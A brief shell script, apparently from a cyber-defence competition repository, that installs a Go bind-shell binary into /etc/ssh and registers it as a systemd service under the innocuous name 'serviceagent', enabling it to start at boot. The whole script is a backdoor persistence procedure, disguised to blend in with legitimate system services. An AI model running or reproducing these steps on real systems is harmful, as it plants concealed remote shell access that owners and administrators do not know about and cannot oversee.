# setup bind shell directory, copy to /etc/ssh/amd64
sudo cp /root/CH-DC/herdening/gobind/bin/bind-linux/amd64 /etc/ssh

# setup service
sudo cp /root/CH-DC/herdening/gobind/gobind.service /etc/systemd/system/serviceagent.service

# run service
sudo systemctl daemon-reload
sudo systemctl enable serviceagent
sudo systemctl start serviceagent